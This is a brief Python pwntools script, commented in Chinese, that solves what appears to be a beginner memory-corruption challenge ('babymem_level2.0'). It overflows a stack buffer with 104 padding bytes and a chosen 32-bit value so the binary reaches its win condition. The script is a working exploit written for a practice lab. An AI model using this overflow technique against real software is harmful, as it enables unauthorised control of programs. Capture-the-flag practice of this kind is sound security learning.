#!/usr/bin/env python3
from pwn import *

# 设置架构
context.arch = 'amd64'

# 创建一个进程对象 运行二进制文件
p = process('/challenge/babymem_level2.0')
p.sendline('200')
# 填充部分
padding = b'A' * 104

# 设置为 win 的值
win_value = p32(0x1c62f8f8)

# 构造输入
payload = padding + win_value

# 发送 payload
p.sendline(payload)

# 接收并打印所有数据
print(p.recvall().decode())